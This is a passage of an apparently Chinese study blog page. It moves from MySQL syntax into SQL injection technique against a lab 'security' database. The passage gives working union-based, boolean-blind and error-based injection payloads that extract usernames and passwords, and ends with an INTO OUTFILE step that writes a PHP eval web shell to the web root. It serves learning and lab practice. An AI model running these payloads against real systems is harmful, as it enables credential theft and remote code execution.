<span class="keyword">from</span> information_schema.schemata；</span><br><span class="line"># 建库：</span><br><span class="line"><span class="keyword">create</span> database <span class="operator">+</span> 库名;</span><br><span class="line"># 删库：</span><br><span class="line"><span class="keyword">drop</span> database <span class="operator">+</span> 库名;</span><br><span class="line"># 进入数据库：</span><br><span class="line">use <span class="operator">+</span> 库名；</span><br><span class="line"></span><br><span class="line"># 查表：</span><br><span class="line"><span class="keyword">show</span> tables；</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>；</span><br><span class="line"># 查列：</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users；</span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>；</span><br><span class="line"># 查字段：</span><br><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> security.users；</span><br></pre></td></tr></table></figure><p><strong>基本函数</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#数据库安装、路径，用户 信息</span><br><span class="line">version();            Mysql 数据库版本</span><br><span class="line">database();           当前 数据库名</span><br><span class="line"><span class="keyword">user</span>();               数据库的用户名</span><br><span class="line"><span class="built_in">current_user</span>();       当前用户名</span><br><span class="line"><span class="built_in">session_user</span>();  连接到数据库的用户名</span><br><span class="line"><span class="built_in">system_user</span>();        系统用户名</span><br><span class="line">@<span class="variable">@datadir</span>();          数据库文件的存放路径</span><br><span class="line">@<span class="variable">@version</span>_compile_os; 操作系统版本</span><br><span class="line">@<span class="variable">@basedir</span>;  数据库的安装目录</span><br><span class="line"></span><br><span class="line">#字符串长度、截取</span><br><span class="line">length();             返回字符串的长度</span><br><span class="line"><span class="built_in">substring</span>(a,b,c);     截取字符串</span><br><span class="line">substr(a,b,c);  </span><br><span class="line">mid(a,b,c);  </span><br><span class="line">三个参数：a.截取的字符串 b.截取的起始位置 c.长度</span><br><span class="line"><span class="keyword">left</span>(a,b);            从左侧截取a的前b位，正确返回<span class="number">1</span>，错误返回<span class="number">0</span></span><br><span class="line"></span><br><span class="line">#字符串配对连接</span><br><span class="line">concat(a,<span class="number">0x5e</span>,b);     字符串配对连接</span><br><span class="line">concat_ws(<span class="string">&#x27;~&#x27;</span>,A,B);   含有分隔符的连接字符串</span><br><span class="line">group_concat();       将字符串连接为一个组，可将不同列分到同一行中</span><br><span class="line"></span><br><span class="line">#字符串特殊处理</span><br><span class="line">ord();                返回ASCII码</span><br><span class="line">ascii(<span class="string">&#x27;a&#x27;</span>);           将字母 a 转换为ascii值</span><br><span class="line">rand();               返回<span class="number">0</span><span class="operator">~</span><span class="number">1</span>之间的随机浮点数</span><br><span class="line">round();              返回最近的整数值</span><br><span class="line">md5();                返回MD5值</span><br><span class="line">hex();                将字符串转换为十六进制</span><br><span class="line">unhex();              hex()的反向操作</span><br><span class="line"><span class="built_in">floor</span>(x);             返回不大于x的最大整数</span><br><span class="line">load_file();          读取文件，返回文件内容作为一个字符串</span><br><span class="line">sleep(a);             沉睡a秒</span><br><span class="line">if(<span class="literal">true</span>,t,f);         判断语句为<span class="literal">true</span> ,执行第一个，否则第二个</span><br><span class="line">find_in_set();        返回字符串在字符串列表中的位置</span><br><span class="line">benchmark();          指定语句执行的次数</span><br><span class="line">name_const();         返回表作为结果</span><br></pre></td></tr></table></figure><p><strong>导入数据：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当希望导入一个 较大 的文件或者是想要批量的执行<span class="keyword">sql</span>语句时，可以使用 mysql 中的 source 命令</span><br><span class="line">使用方法：source <span class="operator">+</span> 文件路径(直接拖拽)</span><br></pre></td></tr></table></figure><h3 id="3-2-语句"><a href="#3-2-语句" class="headerlink" title="3.2 语句"></a>3.2 语句</h3><p><strong>mysql 对 表的结构的更改语句</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># insert</span></span><br><span class="line">insert into 表名(字段名1，字段名2，字段名3......) values(值1，值2，值3......)；</span><br><span class="line"></span><br><span class="line"><span class="comment"># delete</span></span><br><span class="line">delete from 表名 <span class="built_in">where</span> 条件;//可回滚</span><br><span class="line">对于大表：</span><br><span class="line">truncate table 表名;//不可回滚，将会永久丢失</span><br><span class="line"></span><br><span class="line"><span class="comment"># update</span></span><br><span class="line">update 表名 <span class="built_in">set</span> 字段名1=值1,字段名2=值2,......<span class="built_in">where</span> 条件；</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改表名称：</span></span><br><span class="line">语法一： alter table tbl_name rename[to|as] new_tbl_name--可以更改一张数据表名称</span><br><span class="line">语法二：rename table tbl_name to new_tbl_name [,tbl_name2 TO new_tbl_namew……--可以多表更改名称</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加表列</span></span><br><span class="line">alter table <span class="built_in">test</span> add column name varchar(10); </span><br><span class="line"></span><br><span class="line"><span class="comment">#删除表列</span></span><br><span class="line">alter table <span class="built_in">test</span> drop column name; </span><br><span class="line"></span><br><span class="line"><span class="comment">#修改表列类型</span></span><br><span class="line">alter table <span class="built_in">test</span> modify address char(10) </span><br><span class="line">||alter table <span class="built_in">test</span> change address address char(40)</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改表列名</span></span><br><span class="line">alter table <span class="built_in">test</span> change column address address1 varchar(30)</span><br></pre></td></tr></table></figure><p><strong>常用字段</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">select</span> </span><br><span class="line"><span class="keyword">select</span> 字段<span class="number">1</span>，字段<span class="number">2</span>，...... <span class="keyword">from</span> <span class="operator">+</span> 表名 <span class="keyword">where</span> <span class="operator">+</span> 条件;</span><br><span class="line"></span><br><span class="line"># <span class="keyword">between</span> <span class="keyword">and</span> </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">between</span> <span class="number">2</span> <span class="keyword">and</span> <span class="number">8</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">&gt;=</span><span class="number">2</span> <span class="keyword">and</span> id <span class="operator">&lt;=</span><span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"># <span class="keyword">in</span>   <span class="keyword">not</span> <span class="keyword">in</span></span><br><span class="line"><span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">not</span> <span class="keyword">in</span>(<span class="number">5</span>,<span class="number">8</span>);</span><br><span class="line">指查找出 id不等于<span class="number">5</span> 和 id不等于<span class="number">8</span> 的用户的密码</span><br><span class="line">注：不是 <span class="number">5</span><span class="operator">~</span><span class="number">8</span>，<span class="keyword">in</span>之后不是一个区间 </span><br><span class="line"></span><br><span class="line"># <span class="keyword">like</span></span><br><span class="line"><span class="number">1.</span><span class="operator">%</span> 代表任意多个字符</span><br><span class="line"><span class="number">2.</span>_ 代表任意一个字符</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%b%&#x27;</span>;</span><br><span class="line">指查找出用户名中带有字母b的用户名</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;_a%&#x27;</span>;</span><br><span class="line">指查找出用户名中带第二个字母为a的用户名</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%b&#x27;</span>;</span><br><span class="line">指查找出用户名中带最后一个字母为b的用户名</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%\_%&#x27;</span>;</span><br><span class="line">指查找出用户名中带有下划线_的用户名</span><br><span class="line">注：特殊字符需要转义</span><br><span class="line"></span><br><span class="line"># <span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> 字段名；</span><br><span class="line">注：默认为升序排列</span><br><span class="line">指定升序：<span class="keyword">asc</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> 字段名 <span class="keyword">asc</span>；</span><br><span class="line">指定降序：<span class="keyword">desc</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> 字段名 <span class="keyword">desc</span>；</span><br><span class="line">双重需求：</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> 字段名<span class="number">1</span> <span class="keyword">desc</span>,字段名<span class="number">2</span> <span class="keyword">asc</span>；</span><br><span class="line"></span><br><span class="line"># 分组函数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(grade) <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">avg</span>(grade) <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(grade) <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">min</span>(grade) <span class="keyword">from</span> users;</span><br><span class="line"></span><br><span class="line"># 空处理函数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(ifnull(salary,<span class="number">0</span>)<span class="operator">*</span><span class="number">12</span>), <span class="keyword">from</span> crew;</span><br><span class="line">求一年的薪水之和，当薪水为<span class="keyword">NULL</span>时，被当作<span class="number">0</span>来处理</span><br><span class="line"></span><br><span class="line"># <span class="built_in">count</span>(<span class="operator">*</span>) 与 count</span><br><span class="line"><span class="built_in">count</span>(<span class="operator">*</span>) :统计总记录条数，而不是统计某个字段中的数据，与字段无关</span><br><span class="line"><span class="built_in">count</span>(具体的某个字段)：统计具体字段中不为<span class="keyword">NULL</span>的总数</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>字符串数据 sum,avg 为 <span class="number">0</span>，max,min 按字母大小取</span><br><span class="line"><span class="number">2.</span>分组函数会自动忽略 <span class="keyword">NULL</span></span><br><span class="line"><span class="number">3.</span>数学运算 中如果有<span class="keyword">NULL</span>参与，结果为定为<span class="keyword">NULL</span></span><br><span class="line"><span class="number">4.</span>分组函数不能直接出现在 <span class="keyword">where</span> 后面，原因是 <span class="keyword">group</span> <span class="keyword">by</span> 是在<span class="keyword">where</span>语句执行结束之后执行的</span><br><span class="line"><span class="number">5.</span>分组函数可组合使用</span><br><span class="line"></span><br><span class="line"># <span class="keyword">group</span> <span class="keyword">by</span> 与 <span class="keyword">having</span></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span>：按照某个字段或某些字段进行分组</span><br><span class="line"><span class="keyword">having</span>：对分组之后的数据进行再次过滤，即<span class="keyword">having</span> 必须跟在 <span class="keyword">group</span> <span class="keyword">by</span> 后面使用</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(grade) <span class="keyword">from</span> students <span class="keyword">group</span> <span class="keyword">by</span> classes;</span><br><span class="line">先根据班级分组，再查出各个班级的成绩最高学生的成绩</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>分组函数一般与 <span class="keyword">group</span> <span class="keyword">by</span> 联合使用，并且任何一个分组函数（count,sum,avg,max,min）都是在 <span class="keyword">group</span> <span class="keyword">by</span> 语句执行结束后才会执行</span><br><span class="line"><span class="number">2.</span>当一条<span class="keyword">sql</span>语句没有 <span class="keyword">group</span> <span class="keyword">by</span> 时，整张表会自成一组</span><br><span class="line"><span class="number">3.</span>当<span class="keyword">sql</span>语句中使用<span class="keyword">group</span> <span class="keyword">by</span>时，<span class="keyword">select</span>之后只能跟参与分组的字段或者分组函数</span><br><span class="line">注：实际上在 mysql 中，可以使用并且执行，但毫无意义；而由于 Oracle 比 Mysql 要更加严格，在 Oracle 中是绝对严格不能使用的。</span><br><span class="line"></span><br><span class="line"># <span class="keyword">distinct</span> 去重</span><br><span class="line"><span class="keyword">distinct</span> 关键字  去除重复记录</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> job <span class="keyword">from</span> company;</span><br><span class="line">查询该公司中的工作岗位</span><br><span class="line"></span><br><span class="line"># 语句执行顺序</span><br><span class="line"><span class="keyword">select</span>     <span class="number">5</span>号：挑选出满足条件的数据</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span>       <span class="number">1</span>号：定表</span><br><span class="line"></span><br><span class="line"><span class="keyword">where</span>      <span class="number">2</span>号：过滤原始数据</span><br><span class="line"></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span>   <span class="number">3</span>号：进行分组</span><br><span class="line"> </span><br><span class="line"><span class="keyword">having</span>     <span class="number">4</span>号：对数据进行再次过滤</span><br><span class="line"></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span>   <span class="number">6</span>号：进行排序</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># inner join</span></span><br><span class="line">select a.ename,b.dname from emp a join dept b on a.deptno=b.deptno;</span><br><span class="line"></span><br><span class="line"><span class="comment"># left/right join</span></span><br><span class="line">select dname,ename from dept a left join emp b on a.deptno=b.deptno;</span><br></pre></td></tr></table></figure><h2 id="四、union-联合注入-单引号闭合字符型为例"><a href="#四、union-联合注入-单引号闭合字符型为例" class="headerlink" title="四、union 联合注入(单引号闭合字符型为例)"></a>四、union 联合注入(单引号闭合字符型为例)</h2><p>注入判断</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27;</span></span><br><span class="line"><span class="string">?id=1&#x27;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>order by 查列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; order by x--+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> order by x<span class="comment">#</span></span><br><span class="line"><span class="comment"># 其中x输入数字代表哪一列，使用二分法缩小范围,x之后是两个减号与加号，代表注释</span></span><br></pre></td></tr></table></figure><p>判断回显位置，三列为例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,2,3--+</span></span><br><span class="line"><span class="string">?id=0&#x27;</span> union select 1,2,3--+</span><br><span class="line">?id=1<span class="string">&#x27; and 1=2 union select 1,2,3--+</span></span><br><span class="line"><span class="string"># 前面是为了否定 id=1 时的回显，防止人家的 sql 语句只 limit 0,1 </span></span><br><span class="line"><span class="string"># 这样就无法查看到我们想要的信息了</span></span><br></pre></td></tr></table></figure><p>回显位置注入 sql 语句</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,(select database()),3--+</span></span><br></pre></td></tr></table></figure><p>查库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3--+</span></span><br></pre></td></tr></table></figure><p>查某一个库中的表</p><p><code>注意：仅仅是查当前数据库 database() 的表，由于处于当前数据库下，是不能查看其它数据库中数据的</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),3--+</span></span><br></pre></td></tr></table></figure><p>查列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,(select group_concat(column_name) from information_schema.collumns where table_name=&#x27;</span>users<span class="string">&#x27; and table_schema=&#x27;</span>security<span class="string">&#x27;),3--+</span></span><br></pre></td></tr></table></figure><p>查内容，<code>~</code> 连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,(select group_concat(concat_ws(&#x27;</span>~<span class="string">&#x27;,username,password))from security.users),3--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 同时查三列数据的话</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> union select 1,group_concat(id,<span class="string">&#x27;--&#x27;</span>,username,<span class="string">&#x27;--&#x27;</span>,password),3 from users<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="五、Boolean-盲注"><a href="#五、Boolean-盲注" class="headerlink" title="五、Boolean 盲注"></a>五、Boolean 盲注</h2><h3 id="5-1-手动：结合-Burp-爆破进行"><a href="#5-1-手动：结合-Burp-爆破进行" class="headerlink" title="5.1 手动：结合 Burp 爆破进行"></a>5.1 手动：结合 Burp 爆破进行</h3><p>查数据库长度</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and length(database())=1--+</span></span><br><span class="line"><span class="string"># 爆破数字 1</span></span><br></pre></td></tr></table></figure><p>判断库名组成     security</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and left(database(),1)=&#x27;</span>a<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string"># 爆破字母 a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&#x27;</span> and ascii(substr(database(),1,1))=<span class="string">&#x27;b&#x27;</span>--+</span><br><span class="line"><span class="comment"># 爆破 ascii 值 b</span></span><br></pre></td></tr></table></figure><p>查表         users</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit a,1),1,1)) =&#x27;</span>b<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string"># 同时爆破数字a,和 数字b，其中 b 是 ascii 值</span></span><br></pre></td></tr></table></figure><p>查列        username   password</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and ascii(substr((select column_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27; limit a,1),1,1)) = &#x27;</span>b<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string"># 同时爆破数字a,和 数字b，其中 b 是 ascii 值</span></span><br></pre></td></tr></table></figure><p>查内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and ascii(substr((select username from security.users limit a,1),1,1))=&#x27;</span>b<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string"># 爆破 ascii 值 b</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&#x27;</span> and ascii(substr((select password from security.users <span class="built_in">limit</span> 0,1),1,1))=<span class="string">&#x27;b&#x27;</span>--+</span><br><span class="line"><span class="comment"># 爆破 ascii 值 b</span></span><br></pre></td></tr></table></figure><h3 id="5-2-脚本"><a href="#5-2-脚本" class="headerlink" title="5.2 脚本"></a>5.2 脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="六、五大报错注入"><a href="#六、五大报错注入" class="headerlink" title="六、五大报错注入"></a>六、五大报错注入</h2><p><strong>利用条件</strong>：页面回显 SQL语句执行的错误信息，例如 <code>mysql_error()</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># <span class="built_in">floor</span>()</span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>  (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span>  information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># extractvalue()</span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>, concat(<span class="number">0x5c</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()))))</span><br></pre></td></tr></table></figure><p><strong>updatexml()</strong> 函数：</p><p>这个函数的第二个参数本应该是合法的 <code>XPATH</code> 路径，否则就会在引发报错的同时将传入的参数进行输出。我们利用这个特征，当题目存在回显时，将我们想的到的信息传入这个函数的第二个参数即可查询。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># updatexml()</span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">0x3a</span>,concat(<span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">1</span>)))</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># <span class="built_in">exp</span>()</span><br><span class="line">id <span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="built_in">EXP</span>(<span class="operator">~</span>(<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a))</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 六种函数 (使用方法相同)</span><br><span class="line"></span><br><span class="line">GeometryCollection()</span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> GeometryCollection((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">polygon()</span><br><span class="line">id <span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">multipoint()</span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">multilinestring()</span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> multilinestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">linestring()</span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> LINESTRING((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">multipolygon()</span><br><span class="line">id <span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> multipolygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><h2 id="七、文件读写"><a href="#七、文件读写" class="headerlink" title="七、文件读写"></a>七、文件读写</h2><h3 id="7-1-手动"><a href="#7-1-手动" class="headerlink" title="7.1 手动"></a>7.1 手动</h3><p><strong>写文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,&quot;&lt;?php @eval(\$_POST[1]); ?&gt;&quot;,3 into outfile &quot;/var/www/html/1.php&quot;--+</span></span><br><span class="line"><span class="string"># 可将文件内容转换成十六进制</span></span><br><span class="line"><span 